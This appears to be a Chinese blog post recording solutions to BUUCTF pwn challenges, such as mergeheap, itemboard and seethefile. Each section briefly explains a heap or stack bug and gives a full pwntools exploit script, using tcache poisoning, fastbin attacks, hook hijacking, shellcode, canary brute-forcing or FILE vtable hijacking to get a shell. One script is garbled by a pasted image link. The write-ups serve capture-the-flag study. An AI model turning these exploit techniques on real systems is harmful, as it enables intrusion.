---
title: BUUCTF刷题记录
categories: buu刷题
abbrlink: a90346a2
---

## 写在前面

现在BUU第六页快做完了，发现现在有的题目在做的时候确实没想出来，不过看了一眼其他师傅的wp就很快写出来了,如果针对这类题目再去单独写一份wp又没太多必要。所以在之后的做完的题目里，没有必要单独写一篇wp的题目以及直接做出来的题目就都放到这篇文章来简单记录一下了。



## hwb_2019_mergeheap

merge函数可以让两个堆块的内容合并一起，并且新申请出来一个大堆块。让内容合并在一起的思路是先复制第一个堆块的数据，然后再把第二个堆块的数据追加到第一个堆块的后面。**漏洞是追加的时候如果我们申请了例如0x88 0x98 0xa8这样的堆块并且写满了数据，那么还会把第二个堆块的size位给追加上去，从而溢出覆盖了下一个堆块size位**

做一个堆块重叠打tcache poisoning即可。泄露libc地址的话，先申请两个堆块(保证加起来的size大于0x410)，然后合并后将大堆块释放掉，再申请0x8的堆块出来，写入0x8个字符a，对其执行show函数，即可泄露unsorted bin的bk指针

```py
from tools import *
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:28548")

def add(size,content="/bin/sh\x00"):
    p.sendlineafter(">>",str(1))
    p.sendlineafter("len:",str(size))
    p.sendlineafter("content:",content)

def delete(index):
    p.sendlineafter(">>",str(3))
    p.sendlineafter("idx:",str(index))

def show(index):
    p.sendlineafter(">>",str(2))
    p.sendlineafter("idx:",str(index))
    
def merge(idx1,idx2):
    p.sendlineafter(">>",str(4))
    p.sendlineafter("idx1:",str(idx1))
    p.sendlineafter("idx2:",str(idx2))
    
add(0x300)
add(0x300)

merge(0,1)
add(0x300)
delete(2)

add(0x8,'a'*0x8)
show(2)
libc_base=recv_libc()-0x3ec110
log_addr('libc_base')
free_hook=libc_base+libc.symbols['__free_hook']
sys_addr=libc_base+libc.symbols['system']

add(0x2c0)
add(0x100,"a"*0x3d0)
add(0x208,"b"*0x208)

add(0x300)#index 6
add(0x100,"spk_chunk")
add(0xf0)
add(0xf0)

delete(7)
merge(5,6)
delete(9)
debug(p,'pie',0x1094,0x10A0,0x10AC,0x10B8,0x1018)
delete(8)
payload=b"u"*0x100+p64(0)+p64(0x101)+p64(free_hook)
add(0x300,payload)
add(0xf0)
add(0xf0,p64(sys_addr))
delete(0)
p.interactive()
```

![](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211231526971.png)



## jarvisoj_itemboard

本题是控制堆块里存放了delete的函数指针，并且存在UAF漏洞，存在show函数常规泄露libc地址即可。将两个控制堆块都放入fast bin里，然后申请与控制堆块等大的堆块，就可以去控制其中的一个控制堆块，将里面的函数指针改为system地址，此时情况为:

![image-20221123175606412](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211231756781.png)

```py
from tools import *
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:28353","buu64-libc-2.23.so")

def add(size,name="/bin/sh\x00",content="/bin/sh\x00"):
    p.sendlineafter("choose:\n",str(1))
    p.sendlineafter("Item name?\n",name)
    p.sendlineafter("Description's len?\n",str(size))
    p.sendlineafter("Description?",content)

def delete(index):
    p.sendlineafter("choose:\n",str(4))
    p.sendlineafter("Which item?\n",str(index))

def show(index):
    p.sendlineafter("choose:\n",str(3))
    p.sendlineafter("Which item?\n",str(index))
    
def list():
    p.sendlineafter("choose:\n",str(2))
    
add(0x100)

add(0x100)
add(0x60)
add(0x60)
delete(0)

show(0)
libc_base=recv_libc()-0x3c4b78
sys_addr=libc_base+libc.symbols['system']
bin_sh_addr = libc_base +next(libc.search(b"/bin/sh"))
add(0x100)

delete(2)
delete(3)
debug(p,'pie',0xFBA,0xFC6,0xFD2,0xFDE,0xB4F,0xCCB)
payload=b"/bin/sh;aaaaaaaa"+p64(sys_addr)
add(0x18,'uuuu',payload)
log_addr("sys_addr")
delete(2)
p.interactive()
```



## ciscn_2019_c_3

本题存在两个漏洞，一个是UAF，一个是堆溢出(可以溢出0x10个字节，但代价是无法控制fd和bk指针)

由于是2.27的libc，所以就double free,释放同一个堆块8次，让其进入unsorted bin，泄露libc地址。

接下来有俩思路，第一是利用堆溢出篡改size然后打堆块重叠+tcache poisoning劫持free_hook；第二是利用程序里一个backdoor函数，这个函数可以让某个堆块的fd指针加上一个小的值，先打double free让fd指针是一个堆块的地址，然后不断触发backdoor将fd指向free_hook的位置再将其申请出来劫持，最后写入一个one_gadget的地址即可

```py
from tools import *
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:26543")

def add(size,content="/bin/sh\x00"):
    p.sendlineafter("Command: \n",str(1))
    p.sendlineafter("size: \n",str(size))
    p.sendlineafter("Give me the name: \n",content)

def delete(index):
    p.sendlineafter("Command: \n",str(3))
    p.sendlineafter("weapon:\n",str(index))

def show(index):
    p.sendlineafter("Command: \n",str(2))
    p.sendlineafter("index: \n",str(index))
    
add(0x100)
add(0x60)
for i in range(8):
    delete(0)
show(0)
p.recvuntil("attack_times: ")

libc_base=int(p.recv(15))-0x3ebca0
log_info(hex(libc_base))
free_hook=libc_base+libc.symbols['__free_hook']
sys_addr=libc_base+libc.symbols['system']

delete(1)
add(0x60,b'a'*0x10+p64(free_hook-0x10))
delete(1)
delete(1)

for i in range(0x20):
    p.sendlineafter("Command: \n",str(666))
    p.sendlineafter("weapon:\n",str(2))

debug(p,'pie',0x12D1,0x12DD,0x12E9,0x130B)
add(0x60)
add(0x60)
add(0x60,p64(search_og(1)+libc_base))
delete(0)
p.interactive()
```

![image-20221125205436933](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252054342.png)



## nsctf_online_2019_pwn2

本题的漏洞在于这个函数如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252222277.png" alt="image-20221125222254210" style="zoom:50%;" />

该函数可以溢出到bss段0x202090的这个地方，从而篡改一字节，就相当于可以任意堆地址写，任意堆地址读，任意堆地址释放(前提是地址范围都是在可控的最后一字节)。接着就去打堆块重叠泄露libc地址，然后打fastbin attack即可。

```py
from tools import *
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:26263","buu64-libc-2.23.so")

def add(size):
    p.sendlineafter("6.exit\n",str(1))
    p.sendlineafter("Input the size\n",str(size))

def delete():
    p.sendlineafter("6.exit\n",str(2))

def show():
    p.sendlineafter("6.exit\n",str(3))
    
def input_size(size):
    p.sendlineafter("6.exit\n",str(4))
    p.sendafter("Please input your name",size)

def input_content(content):
    p.sendlineafter("6.exit\n",str(5))
    p.sendlineafter("Input the note\n",content)

p.sendlineafter("Please input your name","a"*0x8)


add(0x20)#overflow chunk
add(0x60)#Tampering chunk
add(0x30)
add(0xa0)

input_size('b'*0x30+'\x10')

input_content(b'a'*0x20+p64(0)+p64(0xb1))
input_size('b'*0x30+'\x40')
delete()
add(0x60)

input_size('b'*0x30+'\xb0')

show()
libc_base=recv_libc()-0x3c4b78
log_addr('libc_base')
malloc_hook=libc_base+libc.symbols['__malloc_hook']
realloc=libc_base+libc.symbols['realloc']
input_size('b'*0x30+'\x40')

delete()
add(0x38)
input_size('b'*0x30+'\x10')

input_content(b'a'*0x20+p64(0)+p64(0x71)+p64(malloc_hook-0x23))
add(0x60)

add(0x60)
input_content(b"a"*0xb+p64(search_og(1)+libc_base)+p64(realloc+12))
debug(p,'pie',0xCFF,0xD0B,0xD17,0xD23,0xD2F)
add(0x10)
p.interactive()
```

![image-20221125222657876](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252226217.png)



## metasequoia_2020_samsara

本题的漏洞是存在UAF和后门函数，只需要让栈里的一个变量为0xdeadbeef即可，而程序自己泄露了栈地址，并且可以在需要篡改的变量的低地址处写入一个64位无符号数。所以打一个house of spirit即可触发后门。

```py
from tools import *
context.arch='amd64'
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:29238")

def add():
    p.sendlineafter("choice > ",str(1))

def delete(index):
    p.sendlineafter("choice > ",str(2))
    p.sendlineafter("Index:\n",str(index))

def input_1(index,content):
    p.sendlineafter("choice > ",str(3))
    p.sendlineafter("Index:\n",str(index))
    p.sendlineafter("Ingredient:\n",str(content))
    
def show():
    p.sendlineafter("choice > ",str(4))
    
def move(content):
    p.sendlineafter("choice > ",str(5))
    p.sendlineafter("Which kingdom?\n",str(content))
    
add()
add()

delete(0)
delete(1)
delete(0)
show()
p.recvuntil('\x78')
stack_addr=int(p.recv(12),16)
log_addr('stack_addr')
move(0x21)

input_1(0,stack_addr-8)

add()
add()
debug(p,'pie',0xB99,0xC02,0xC57,0xCCF,0xCE9,0xC9A)
input_1(3,0xdeadbeef)
p.sendlineafter("choice > ",str(6))
p.interactive()
```

![image-20221126111155652](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261111067.png)



## huxiangbei_2019_hacknote

本题是静态链接的题目(任何保护都没有)，在edit函数里存在一个off by one的漏洞(第一次输入一个超过size的字符串，第二次再edit一次，就可以触发off by one)，打一个堆块重叠加fastbin attack。因为是静态链接，所以malloc_hook是在data段上，又没开PIE，所以fastbin attack就可以直接劫持fd的位置为malloc_hook。为了绕过检查，改成malloc_hook-0x16如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261551786.png" alt="image-20221126155133663" style="zoom:50%;" />

最终将malloc_hook里写入malloc_hook+8后面紧跟shellcode即可

```py
from tools import *
context.log_level='debug'
p=load("b","node4.buuoj.cn:26161")

def add(size,content):
    p.sendlineafter("-----------------\n",str(1))
    p.sendlineafter("Input the Size:\n",str(size))
    p.sendlineafter("Input the Note:\n",content)

def delete(index):
    p.sendlineafter("-----------------\n",str(2))
    p.sendlineafter("Input the Index of Note:",str(index))

def edit(index,content):
    p.sendlineafter("-----------------\n",str(3))
    p.sendlineafter("Input the Index of Note:\n",str(index))
    p.sendlineafter("Input the Note:\n",content)


add(0x18,'a'*0x30)

add(0x58,'b'*0x29)
add(0x30,'iiii')
add(0x30,'prevent merge')
#0x6CB788
edit(0,'c'*0x19)
edit(0,b'd'*0x10+p64(0)+b'\xa1')

delete(1)
delete(2)

add(0x90,p64(0)*11+p64(0x41)+p64(0x6CB788-0x16))

add(0x30,'e'*8)
debug(p,0x400EB9,0x400ECA,0x400EA8)
add(0x30,b'a'*6+p64(0x6CB788+8)+shellcode_store('shell_64'))
p.sendlineafter("-----------------\n",str(1))
p.sendlineafter("Input the Size:\n",str(0x10))
p.interactive()

```

![image-20221126155434205](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261554595.png)



## picoctf_2018_buffer overflow 3

本题以 `ssh` 登录，无法直接去打远程，而是登录远程服务器，来打的本地，需要注意的是本地也没有 `pwntools` ，所以无法用 `py` 脚本来打。

本题就是自己实现了一个四字节的 `canary` (从 `canary.txt` 文件中读取的),然后有个明显的栈溢出，并且给了后门函数读取 `flag`

关键点如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041630782.png" alt="image-20230204163000453" style="zoom:50%;" />

第 `21` 行，可以往 `buf` 直接溢出，控制 `s1` ，但需要注意的是 `s1` 本来的数据存放的就是 `canary` ，这就意味着我们可以先输入一个字符，因为后面三个字符一定是正确的（不覆盖的话），如果这个字符正确，就可以通过检查，从而实现 `canary`  一个一个字符的比对。

因此这里的我们 `ssh` 登录上后，用这个 `shell` 命令 

```shell
for i in {0..255}; do python -c "print \"33\\n\" + \"U\"*32 + chr($i)" | ./vuln >/dev/null && echo "$i"; done
```

来将 `canary` 的第一个字符来爆破出来，一次类推进行逐位爆破，具体而言，循环语句 `for i in {0..255}` 将 `$i$` 从 `0` 到 `255` 依次设置为变量。对于每一次迭代，该命令都使用 `python` 解释器执行以下脚本：

```
perlCopy code
print "33\n" + "U"*32 + chr($i)
```

该脚本打印了字符串 "33\n"，然后使用重复字符 "U" 的字符串（长度为 32）连接上 ASCII 码为 $i 的字符，最后通过管道符（|）将输出重定向到可执行文件 `./vuln`。输出的内容被重定向到 `/dev/null`，以避免在屏幕上显示。

如果执行 `./vuln` 程序的退出代码为零，则表明程序正常退出，并使用命令 `echo "$i"` 将当前 $i 的值打印到屏幕上。

依次类推将每一位的 `canary` 都爆破出来 ，因为题目给了后门函数，因此最后返回地址填充成后门函数的地址即可

![image-20230205091810320](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302050918794.png)



## pwnable_seethefile

这题我是真的烦，这题的 `_IO_file_close` 和 `_IO_new_file_finish` 都可以劫持，因为我调试的时候是先看触发了 `_IO_file_close` ,所以就想着来打这个。按理说只要检查绕过了能触发，劫持`vtable` 之后打哪个都一样，但是我打 `_IO_file_close` 远程死活不通（本地是能通的）  然后网上一搜 `wp` 发现全打的是 `_IO_new_file_finish` , 我也不知道为啥都会想着去打这个位于后面的函数指针...

有个除了 `flag` 文件的任意文件读取，所以直接去读 `/proc/self/maps` 文件获取 `libc` 地址，然后有个很明显的篡改文件指针的漏洞，就伪造一个 `IO_FILE` 然后控制 `vtable` ，总之这题除了那个获取 `libc` 地址的操作我是第一次见之外，后面攻击 `IO` 流都是入门操作... 不说了 越想越气

这里的 `exp` 注释的部分是我最初打 `_IO_new_file_finish` 的 `payload` 。本题能打通，远程不行...  **注意：获取的 `libc` 地址 `+0x1000` 才是 `libc` 基地址**

```py
from tools import *
context.log_level='debug'
context.arch='amd64'
p,e,libc=load('a',"node4.buuoj.cn:25199","/home/zikh/Desktop/buu32-libc-2.23.so")
debug(p,0x08048AE0)

p.sendlineafter("Your choice :",str(1))
p.sendlineafter("What do you want to see :",'/proc/self/maps')

p.sendlineafter("Your choice :",str(2))
p.sendlineaft![image-20230208221017928](C:/Users/86137/AppData/Roaming/Typora/typora-user-images/image-20230208221017928.png)er("Your choice :",str(3))
for i in range(3):
    p.recvline()

heap_base=int(p.recv(8),16)
log_addr('heap_base')
p.recvline()
libc_base=int(p.recv(8),16)+0x1000
log_addr('libc_base')
sys_addr=libc_base+0x0003a940
log_addr('sys_addr')
p.sendlineafter("Your choice :",str(5))

# vtable_addr=0xdeadbeef
# io_file_addr=0x804b284
# io_file=b"/bin/sh;"#_flags
# io_file+=p32(0x0)*11
# io_file+=p32(libc_base+0x1d8ce0)
# io_file+=p32(0x3)#fileno
# io_file+=p32(0x0)*3
# io_file+=p32(heap_base+0x1208)
# io_file+=p32(0xffffffff)
# io_file+=p32(0xdeadbeef)*17
# io_file+=p32(0x804b2d8)
# io_file+=p32(sys_addr)


# payload=p32(0xdeadbeef)*0x8
# payload+=p32(io_file_addr)
# payload+=io_file

payload  = p32(0xdeadbeef)*0x8
payload += p32(0x0804B284)
payload += p32(0xffffdfff)
payload += b";sh"+b'\x00'*0x8d
payload += p32(0x0804B284+0x98)
payload += p32(sys_addr)*3
p.sendlineafter("Leave your name :",payload)
p.interactive()
```



![image-20230208221024944](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302082210135.png)

参考文章：https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/
